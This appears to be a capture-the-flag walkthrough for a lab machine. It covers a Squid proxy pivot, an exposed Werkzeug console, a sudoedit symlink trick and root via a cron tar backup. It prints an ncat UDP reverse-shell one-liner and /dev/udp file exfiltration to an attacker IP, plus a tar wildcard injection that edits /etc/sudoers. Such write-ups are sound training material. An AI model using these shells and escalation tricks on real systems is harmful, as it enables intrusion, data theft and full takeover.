# Exploitation

## Squid Proxy w/o credentials

- Accessing the squid proxy without credentials returns an unauthorised error.
- Nothing to do w/o credentials.

## TFTP - Getting Files

- With `TFTP`, we can request `Squid Proxy` configuration files. 
- We found a set of credentials in `/etc/squid/passwords` file, which we can crack and get `kalamari \ ihateseafood` .
- Now, with these, we can access squid proxy.

## Squid Proxy /w credentials

- Accessing `http://<SERVER_IP>:<PORT>` or `http://localhost:<PORT>` returns `403` or `503` for every port.
- Accessing `http://127.0.0.1:<PORT>` shows port 80 and port 58616 are open.

```shell
$ seq 1 65535 | ffuf -x http://kalamari:ihateseafood@10.10.10.21:3128 -u http://127.0.0.1:FUZZ -w - -o available_ports -fc 403

```

- Port 80 runs  `flask` application named `Shorty` as in a `URL shortner`.

## `Shorty` | Flask Application running at `127.0.0.1:80`

- A directory bruteforce to this app reveals an endpoint `/console` . This endpoint is an interface to python console.  

## `UDP` Reverse Shell

- This python console does not have any limitations, any command can be executed including system commands as well.
- This makes this console as a dangerous security flaw.
- `Whoami`
```python
import os
os.getlogin()
# 'werkzeug'
```

- Trying to get a `TCP` reverse shell fails.
- After checking in-built firewall rules, it shows all `TCP Outbound and Ibound (except port 22 and 3128)`connections are *dropped*.
```python
with open('/etc/iptables/rules.v4', 'r') as f: print(f.read())
# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017

```
- Only `UDP` outbound connections are allowed. This means I could go for a `UDP` reverse shell, or a `UDP` bind shell.
- From `revshells.com` , 2 options are available for a `UDP Reverse Shell` , the `Bash UDP` does not work for some reason.
- The `Ncat UDP` works. : 
```python
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.10.14.25 9001 >/tmp/f").read()
```

Setting up Listener : 
```shell
$ nc -lnvp 9001 -u
```

and I get a shell as `Werkzeug`.

<hr>

# Lateral Movement

- After getting a shell as `Werkzeug` , I land in `/var/www`. I see here 3 files and directories.
```shell
$ ls -la
manage-shorty.py shorty/ testing/
```

## Checking `shorty.db` 

- The `manage-shorty.py` files shows the location of the `db` file at `/var/www/shorty/shorty.db`.
- Its unlikely that this file would contain any user data, as their was no login or register location in the app.
- Still, to check this, I transfer it to my machine:
```shell
$ cat shorty.db > /dev/udp/10.10.14.25/9002 
```

To catch this file : 
```shell
$ nc -lnvp 9002 -u | tee shorty.db
```

- Now, reading this file with `sqlite3` , it only has a single table called `urls` with no entries.

##  `sudo -l`

- Checking `sudo -l`, we have access to run `sudoedit` as `alekos` for a file located at `/var/www/*/*/layout.html`
- Since it was a python application, my first thought was to exploit `SSTI` by injecting a reverse shell , but the file at `/var/www/shorty/templates/layout.html` was owned by `root` , and also **It won't be of any use as I would get the same shell as `Werkzeug`**.
- I have complete access over `/var/www/testing/` directory.

## `Sudoedit`

- I create a symbolic link under `/var/www/testing/conner/` to `/home/alekos/.ssh/authorized_keys` names as `layout.html` 
- This satisfies the entry under `sudo -l`.
- Now, since I have edit access for `layout.html` as `alekos`, I can edit the designated file of symbolic link `authorized_keys` as it is owned by `alekos` , and add my `public_key` to this file.
- Finally, I can just `SSH` into the box as `alekos` using my `SSH Key`.

# Privilege Escalation

- The home directory of `alekos` had two folders : `development` and `backup` 
- The `backup` folder contains `.tar.gz` of the `development` folder created every 5 minutes.
- These backups have to be created using a cron script owned by root, as all the files inside `backup` are owned by `root`.

## Exploit 1 : `tar` Wildcard

- `tar` has a functionality that enable to run a command after reaching every Nth record
```
 --checkpoint[=N]
        Display progress messages every Nth record (default 10).
```

- This action can be defined using : 
 ```
--checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

- To exploit this, we create three files with the following names :
	- `--checkpoint=1` : empty file, this when used with `tar` to archive will tell that it has reached a checkpoint, and now has to run the action specified by 
	  `--checkpoint-action=ACTION`
	- `--checkpoint-action=exec=sh root.sh` : another empty file, this will tell `tar` to execute `root.sh` script using `sh` after reaching checkpoint.
	- `root.sh` : The script file that will contain our commands
```shell
echo 'echo "alekos ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

- After 5 minutes, a new archive using `tar` will be created, and when we use `sudo -i` , we will be dropped into `root` shell without password.

## Exploit 2 : Symbolic Link

- The script wants `/home/alekos/development` directory. It does not checks it contents nor it checks if its a **symbolic link** or not.
- To exploit this behaviour, we will first move the original `development` folder to somewhere else.
- Next, we create a symbolic link for the `/root` directory, name it as `development` and place it under `/home/alekos`.
- Now, when the script runs, it would create a backup of the `/root` directory instead of the intended `development` folder.
- We can extract the latest archive, and view content of its files.

## Exploit 3 : Breaking Back(up script)

This is what the backup `cron` script looks like : 
```shell
root@joker:~$ cat backup.sh 
#!/bin/sh

FILENAME="dev-$(date +%s).tar.gz"

cd /home/alekos/development;
tar cf /home/alekos/backup/$FILENAME *;
chown root:alekos /home/alekos/backup/$FILENAME;
chmod 640 /home/alekos/backup/$FILENAME;
``` 

- The script first changes directory to `/home/alekos/development`.
- Then, it adds everything (`*`) present in the directory it currently in to the archive.
- If there is no `development` folder, the `cd` command will fail, and the script working directory will be `/root` itself.
- This will make the script to create a backup of the `/root` directory, which we can extract later and read content of all the files.
